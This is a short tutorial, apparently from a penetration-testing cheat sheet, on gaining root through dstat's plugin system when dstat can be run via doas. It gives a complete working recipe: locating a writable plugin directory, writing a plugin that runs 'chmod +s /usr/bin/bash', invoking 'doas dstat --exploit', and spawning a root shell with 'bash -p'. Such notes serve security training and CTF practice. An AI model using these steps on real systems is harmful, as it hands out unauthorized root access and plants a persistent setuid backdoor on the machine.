# dstat

`dstat` is a nice tool for generating system resource stats. You can read more about it using `man dstat`.

One of the issue with `dstat` is that it comes with a plugin system ([https://linux.die.net/man/1/dstat](https://linux.die.net/man/1/dstat)). So if we are able to run `dstat` as a higher privileged user, and we are able to create or modify plugins, we can gain privesc. Usually admins will use `doas` to configure this, so check the `doas` configuration file.

You can find a list of directories that contains the word `dstat` by

```
find / -type d -name dstat 2>/dev/null
```

Usually, there is a directory called `/usr/local/share/dstat`. If you can write to this directory, you are in for a treat.

Simply create a file under this directory called `dstat_exploit.py` with the following content

```python
import os

os.system('chmod +s /usr/bin/bash')
```

Now we just need to run `dstat` as root with the plugin, you can use `doas`.

```
doas dstat --exploit
```

The exploit has been executed, you can now obtain root shell.

```
bash -p
```

#### Appendix

[https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/)
